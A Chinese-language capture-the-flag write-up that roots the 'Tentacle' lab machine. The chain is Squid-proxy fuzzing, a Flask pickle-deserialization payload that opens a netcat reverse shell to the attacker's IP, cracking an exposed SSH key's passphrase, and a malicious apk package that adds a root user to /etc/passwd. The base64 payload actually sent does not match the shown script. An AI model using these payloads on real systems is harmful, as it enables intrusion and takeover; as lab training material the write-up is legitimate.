---
date: 2026-03-28T12:30:00Z
title : 'MazeSec-Tentacle'
tags: ["mazesec"]
featured: false
---

## 信息收集

```bash
$ nmap -p- 192.168.31.68 --min-rate 5000                                                     
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 00:33 -0400
Nmap scan report for Tentacle (192.168.31.68)
Host is up (0.00086s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3128/tcp open  squid-http
MAC Address: 08:00:27:2F:A2:03 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 3.30 seconds

$ nmap -sVC -O -p 22,80,3128 192.168.31.68 -oN nmapscan/nmap_tcp
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 00:38 -0400
Nmap scan report for Tentacle (192.168.31.68)
Host is up (0.00052s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 10.0 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.66 ((Unix))
|_http-server-header: Apache/2.4.66 (Unix)
|_http-title: Tentacle Systems | Global Infrastructure
| http-methods: 
|_  Potentially risky methods: TRACE
3128/tcp open  http-proxy Squid http proxy 6.12
|_http-server-header: squid/6.12
|_http-title: ERROR: The requested URL could not be retrieved
MAC Address: 08:00:27:2F:A2:03 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.89 seconds
```



```bash
$ dirsearch -u http://192.168.31.68/ --timeout=30
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/dingtom/reports/http_192.168.31.68/__26-03-28_00-38-58.txt

Target: http://192.168.31.68/

[00:38:58] Starting: 
[00:38:59] 403 -  316B  - /.ht_wsr.txt
[00:38:59] 403 -  316B  - /.htaccess.bak1
[00:38:59] 403 -  316B  - /.htaccess.orig
[00:38:59] 403 -  316B  - /.htaccess.sample
[00:38:59] 403 -  316B  - /.htaccess_extra
[00:38:59] 403 -  316B  - /.htaccess.save
[00:38:59] 403 -  316B  - /.htaccess_sc
[00:38:59] 403 -  316B  - /.htaccess_orig
[00:38:59] 403 -  316B  - /.htaccessOLD
[00:38:59] 403 -  316B  - /.htaccessBAK
[00:38:59] 403 -  316B  - /.htaccessOLD2
[00:38:59] 403 -  316B  - /.htm
[00:38:59] 403 -  316B  - /.html
[00:38:59] 403 -  316B  - /.htpasswd_test
[00:38:59] 403 -  316B  - /.htpasswds
[00:38:59] 403 -  316B  - /.httr-oauth
[00:39:04] 200 -  820B  - /cgi-bin/printenv
[00:39:04] 200 -    1KB - /cgi-bin/test-cgi
[00:39:13] 403 -  316B  - /server-status
[00:39:13] 403 -  316B  - /server-status/
[00:39:18] 403 -  316B  - /~apache
[00:39:18] 403 -  316B  - /~bin
[00:39:18] 403 -  316B  - /~daemon
[00:39:18] 403 -  316B  - /~ftp
[00:39:18] 403 -  316B  - /~games
[00:39:18] 403 -  316B  - /~guest
[00:39:18] 403 -  316B  - /~halt
[00:39:18] 403 -  316B  - /~lp
[00:39:18] 403 -  316B  - /~mail
[00:39:18] 403 -  316B  - /~news
[00:39:18] 403 -  316B  - /~nobody
[00:39:18] 301 -  356B  - /~operator  ->  http://192.168.31.68/~operator/
[00:39:18] 403 -  316B  - /~root
[00:39:18] 403 -  316B  - /~sync
[00:39:18] 403 -  316B  - /~shutdown
[00:39:18] 403 -  316B  - /~uucp

Task Completed
```

可以看到有 ~operator, cgi-bin
还有 squid 代理

>Squid (全称 Squid Cache) 是一种高性能的开源代理服务器和 Web 缓存软件，主要用于 Linux/Unix 系统。它支持 HTTP、HTTPS、FTP 等协议，通过在内存和硬盘中缓存网络对象，显著提高用户访问速度、节省带宽，并具备强大的流量访问控制和安全防护功能。  
缓存加速（Caching）： 将经常访问的网页内容保存在本地，当下一个用户请求同一内容时，直接从本地快速返回，大大减少网站访问延迟。  
带宽优化： 减少重复请求互联网数据的次数，从而降低出口带宽的使用量。  
代理访问： 作为中间人（代理）代用户处理请求，既可用于企业限制员工访问特定网站（ACL），也用于保护内部网络，隐藏实际服务器IP。  
高可用性： 支持“代理服务器链”，能够向上级代理转发数据，是 CDN（内容分发网络）和网络服务提供商的常用技术。


看了一下 Squid 代理怎么用

```bash
$ curl -x http://192.168.31.68:3128 http://127.0.0.1/
<!DOCTYPE html>
<html lang="en">
...

    <footer class="border-t border-slate-800 py-12 text-center text-slate-500 text-xs">
        <p>&copy; 2026 Tentacle Systems International. All rights reserved. Registered in Switzerland.</p>
    </footer>
</body>
</html>
```

有页面，跟 80 端口的不一样，80端口啥也没有

```bash
$ ffuf -u http://127.0.0.1:FUZZ/ -x http://192.168.31.68:3128 -w <(seq 1 65535) -mc 200,301,302,401,403,500 -t 50         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:FUZZ/
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://192.168.31.68:3128
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200,301,302,401,403,500
________________________________________________

9                       [Status: 403, Size: 3490, Words: 327, Lines: 143, Duration: 29ms]
...
79                      [Status: 403, Size: 3493, Words: 327, Lines: 143, Duration: 7ms]
80                      [Status: 200, Size: 3538, Words: 764, Lines: 64, Duration: 7ms]
81                      [Status: 403, Size: 3493, Words: 327, Lines: 143, Duration: 7ms]
...
1023                    [Status: 403, Size: 3499, Words: 327, Lines: 143, Duration: 22ms]
989                     [Status: 403, Size: 3496, Words: 327, Lines: 143, Duration: 43ms]
5000                    [Status: 200, Size: 63, Words: 5, Lines: 1, Duration: 100ms]
52144                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 37ms]
```

有 80, 5000, 52144 端口，52144 是大端口，一般不看

```bash
$ curl http://192.168.31.68:3128 http://127.0.0.1:5000/
...
</head><body id=ERR_INVALID_URL>
<div id="titles">
<h1>ERROR</h1>
<h2>The requested URL could not be retrieved</h2>
</div>
<hr>

<div id="content">
<p>The following error was encountered while trying to retrieve the URL: <a href="/">/</a></p>

<blockquote id="error">
<p><b>Invalid URL</b></p>
</blockquote>

<p>Some aspect of the requested URL is incorrect.</p>

<p>Some possible problems are:</p>
<ul>
<li><p>Missing or incorrect access protocol (should be <q>http://</q> or similar)</p></li>
<li><p>Missing hostname</p></li>
<li><p>Illegal double-escape in the URL-Path</p></li>
<li><p>Illegal character in hostname; underscores are not allowed.</p></li>
</ul>

<p>Your cache administrator is <a href="mailto:webmaster?subject=CacheErrorInfo%20-%20ERR_INVALID_URL&amp;body=CacheHost%3A%20Tentacle%0D%0AErrPage%3A%20ERR_INVALID_URL%0D%0AErr%3A%20%5Bnone%5D%0D%0ATimeStamp%3A%20Sat,%2028%20Mar%202026%2009%3A18%3A02%20GMT%0D%0A%0D%0AClientIP%3A%20192.168.31.187%0D%0A%0D%0AHTTP%20Request%3A%0D%0A%0D%0A%0D%0A">webmaster</a>.</p>
<br>
</div>

<hr>
<div id="footer">
<p>Generated Sat, 28 Mar 2026 09:18:02 GMT by Tentacle (squid/6.12)</p>
<!-- ERR_INVALID_URL -->
</div>
</body></html>
curl: (7) Failed to connect to 127.0.0.1 port 5000 after 0 ms: Could not connect to server
```

应该是 flask 应用啥的，反正应该是需要参数

```bash
$ ffuf -u http://127.0.0.1:5000/FUZZ -x http://192.168.31.68:3128 -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,401,403,500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:5000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://192.168.31.68:3128
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,401,403,500
________________________________________________

api                     [Status: 403, Size: 76, Words: 8, Lines: 2, Duration: 137ms]
:: Progress: [6453/6453] :: Job [1/1] :: 234 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
```

有个 api 的参数

```bash
$ curl -i -s -x http://192.168.31.68:3128 http://127.0.0.1:5000/

HTTP/1.1 200 OK
Server: Werkzeug/3.1.6 Python/3.12.12
Date: Sat, 28 Mar 2026 05:01:05 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 63
Cache-Status: Tentacle;fwd=stale;detail=match
Via: 1.1 Tentacle (squid/6.12)
Connection: keep-alive

<h1>Tentacle Internal Management API</h1><p>Status: Running</p>                                                                                                                                                                        

$ curl -i -s -x http://192.168.31.68:3128 http://127.0.0.1:5000/api
HTTP/1.1 403 Forbidden
Server: Werkzeug/3.1.6 Python/3.12.12
Date: Sat, 28 Mar 2026 05:01:14 GMT
Content-Type: application/json
Content-Length: 76
Cache-Status: Tentacle;detail=mismatch
Via: 1.1 Tentacle (squid/6.12)
Connection: keep-alive

{"error":"Forbidden","message":"Direct access to API root is not allowed."}

$ ffuf -u http://127.0.0.1:5000/api/FUZZ -x http://192.168.31.68:3128 -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,400,401,403,500

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:5000/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://192.168.31.68:3128
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,400,401,403,500
________________________________________________

                        [Status: 403, Size: 76, Words: 8, Lines: 2, Duration: 54ms]
status                  [Status: 200, Size: 81, Words: 1, Lines: 2, Duration: 106ms]
:: Progress: [4614/4614] :: Job [1/1] :: 502 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```
可以跟上 status

```bash
$ curl -i -s -x http://192.168.31.68:3128 http://127.0.0.1:5000/api/status                                                                   
HTTP/1.1 200 OK
Server: Werkzeug/3.1.6 Python/3.12.12
Date: Sat, 28 Mar 2026 05:02:30 GMT
Content-Type: application/json
Content-Length: 81
Cache-Status: Tentacle;fwd=stale;detail=match
Via: 1.1 Tentacle (squid/6.12)
Connection: keep-alive

{"cpu":"12%","main_process":"~operator/Tentacle/app.py","memory":"450MB/2048MB"}
```

可以看到这里有个目录，和上面的 /~operator 目录对应上了

```bash
$ curl -s http://192.168.31.68/~operator/Tentacle/app.py
```
```python
# app.py
import pickle
import base64
import os
import logging
from flask import Flask, request, jsonify

app = Flask(__name__)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - INTERNAL_ADMIN - %(levelname)s - %(message)s'
)

INTERNAL_TOKEN = "Secret_Admin_Token_2026"

@app.route('/')
def index():
    return "<h1>Tentacle Internal Management API</h1><p>Status: Running</p>"

@app.route('/api')
@app.route('/api/')
def api_index():
    return jsonify({"error": "Forbidden", "message": "Direct access to API root is not allowed."}), 403

@app.route('/api/deploy', methods=['POST'])
def deploy_task():
    auth_header = request.headers.get('X-Internal-Auth')
    
    task_data = request.form.get('task_data')
    
    if not task_data:
        return jsonify({"status": "error", "message": "Missing task_data"}), 400

    try:
        decoded_data = base64.b64decode(task_data)
        obj = pickle.loads(decoded_data)
        
        logging.info(f"Task received and processed: {type(obj).__name__}")
        return jsonify({"status": "success", "message": "Deployment initiated"}), 200
        
    except Exception as e:
        logging.error(f"Failed to process task: {str(e)}")
        return jsonify({"status": "error", "message": "Invalid task format"}), 500

@app.route('/api/status')
def system_status():
    return jsonify({
        "cpu": "12%",
        "memory": "450MB/2048MB",
        "main_process": "~operator/Tentacle/app.py",
    })

if __name__ == "__main__":
    print("Tentacle Backend Service starting on http://127.0.0.1:5000")
    app.run(host='127.0.0.1', port=5000, debug=False)
```

很明显有 pickle 的利用链

```python
# payload.py
import pickle
import base64
import os

class Exploit(object):
    def __reduce__(self):
        cmd = "busybox nc 192.168.31.187 1234 -e sh"
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit())
b64_payload = base64.b64encode(payload).decode('utf-8')
print(b64_payload)
```

```bash
# Session 1
$ curl -x http://192.168.31.68:3128 -X POST -d "task_data=gASVWAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjD1jcCAvZXRjL3NoYWRvdyAvdG1wL3NoYWRvd19jb3B5ICYmIGNobW9kIDc3NyAvdG1wL3NoYWRvd19jb3B5lIWUUpQu" http://127.0.0.1:5000/api/deploy

# Session 2
$ nc -lvnp 1234
```

写一对公私钥方便以后操作

## 权限提升

#### To licksore

```bash
$ ssh operator@192.168.31.68 -i id 
              _                          
__      _____| | ___ ___  _ __ ___   ___ 
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
                                         
Tentacle:~$ id
uid=1001(operator) gid=1001(operator) groups=1001(operator)
```

```bash
Tentacle:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/sh
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
licksore:x:1000:1000::/home/licksore:/bin/sh
operator:x:1001:1001::/home/operator:/bin/sh
```

```bash
Tentacle:~$ ls -la
total 4048
drwx-----x    4 operator operator      4096 Mar 28 16:28 .
drwxr-xr-x    4 root     root          4096 Feb 24 22:31 ..
lrwxrwxrwx    1 root     operator         9 Feb 24 22:45 .ash_history -> /dev/null
drwx------    2 operator operator      4096 Mar 28 13:14 .ssh
-rw-------    1 operator operator      3953 Mar 28 16:28 .viminfo
drwxr-xr-x    3 root     operator      4096 Feb 25 10:33 public_html
-rw-r--r--    1 root     operator        44 Feb 24 22:40 user.txt
```

又是经典 ash, 哈哈

然后这里卡了一会 因为啥也没有，然后去搜了一下 public_html 是什么东西


>public_html 是大多数 Linux 主机（如 cPanel、DirectAdmin）中存放网站文件的根目录。访问者可以通过域名访问其中内容，网站的 index.html 或 index.php 必须置于此文件夹内才能正常显示。  
作用： 用户在浏览器输入域名时，服务器会在 public_html 文件夹中寻找要显示的文件。  
位置： 通常位于用户主目录（/home/username/public_html）下。  
安全： 为了防止公众访问，建议将敏感文件（如数据库配置文件、PHP类库）放在 public_html 之上的目录。  
快捷路径： FTP根目录下的 public_html 通常是跳转到默认网站根目录的快捷路径。

那我们可以联想到是不是 licksore 目录下也有

```bash
Tentacle:~$ cat /etc/apache2/conf.d/userdir.conf 
<IfModule userdir_module>
# Settings for user home directories
#
# Required module: mod_authz_core, mod_authz_host, mod_userdir

#
# UserDir: The name of the directory that is appended onto a user's home
# directory if a ~user request is received.  Note that you must also set
# the default access control for these directories, as in the example below.
#
UserDir public_html

#
# Control access to UserDir directories.  The following is an example
# for a site where these directories are restricted to read-only.
#
<Directory "/home/*/public_html">
    AllowOverride FileInfo AuthConfig Limit Indexes
    Options MultiViews Indexes SymLinksIfOwnerMatch IncludesNoExec
    Require method GET POST OPTIONS
</Directory>

</IfModule>
```

```bash
Tentacle:~/public_html$ ls -la /home/licksore/public_html/

total 16
drwxr-xr-x    3 licksore licksore      4096 Feb 25 10:44 .
drwx-----x    4 licksore licksore      4096 Feb 25 10:39 ..
drwxr-xr-x    2 licksore licksore      4096 Feb 25 10:43 .ssh
-rw-r--r--    1 licksore licksore        28 Feb 24 22:56 index.html
```

```bash
Tentacle:~$ cat /home/licksore/public_html/.ssh/id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAEecoyn8
FswnK5npBrVZ4uAAAAGAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDZ5M9v8S/q
MEaaH06lnrA46UpRGcmrI3Um9kpaBj500MXz0wpApyAvw26MBqnymGfOGfg1B+njaDmheY
...
m32uFGPVSra7kANPVad9cqrRIa5BtCiDNKYfUXTUSpPBvNK2ev57vRa/YZD4nvGnZV865c
0tAYcI7Hmyyx6nTqQR2aUSsP/emUWqjOGdy0CRqfBf6LEvwkaJlV1z+qPNeZnwnXfeODUD
7/eMCbAKlvQ6t7oPmxwlCONa3fU=
-----END OPENSSH PRIVATE KEY-----
```

直接登录

```bash
$ ssh licksore@192.168.31.68 -i id2
Enter passphrase for key 'id2':
```

什么? 还有 passphrase，好吧，解密一下

```bash
$ ssh2john id2 > id_hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt id_hash       
...
justice          (id2)     
1g 0:00:00:18 DONE (2026-03-28 05:50) 0.05434g/s 67.82p/s 67.82c/s 67.82C/s 753951..shirley
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## To root

```bash
$ ssh licksore@192.168.31.68 -i id2
Enter passphrase for key 'id2': 
              _                          
__      _____| | ___ ___  _ __ ___   ___ 
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
                                         
Tentacle:~$ id
uid=1000(licksore) gid=1000(licksore) groups=1000(licksore)
```

```bash
Tentacle:~$ sudo -l
Matching Defaults entries for licksore on Tentacle:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for licksore:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User licksore may run the following commands on Tentacle:
    (ALL) NOPASSWD: /sbin/apk
```

ez 了

直接贴步骤，不说了

```bash
Tentacle:~$ cd /tmp
Tentacle:~$ mkdir -p build_pkg
Tentacle:~$ cd build_pkg
```

```bash
Tentacle:~$ vim .PKGINFO
pkgname = rootpwn
pkgver = 1.0-r0
pkgdesc = privilege escalation
size = 1000
```

```bash
Tentacle:~$ vim .pre-install
#!/bin/sh
# password: 111111
echo 'hacker:$1$DhMw2ANK$s0Iu1RQPCyn8jbR7asAjl0:0:0:hack,,,:/root:/bin/bash' >> /etc/passwd
exit 0

Tentacle:~$ chmod +x .pre-install

Tentacle:~$ tar -czf rootpwn-1.0-r0.apk .PKGINFO .pre-install
```

```bash
Tentacle:~$ sudo /sbin/apk add --allow-untrusted ./rootpwn-1.0-r0.apk
Tentacle:~$ su hacker

~ # id
uid=0(root) gid=0(root) groups=0(root)

~ # cat /home/operator/user.txt /root/root.txt 
flag{user-43764e48361c256a0a93abf737fc5856}
flag{root-8abdc8eb17a3772df16ba7168f33cc20}
```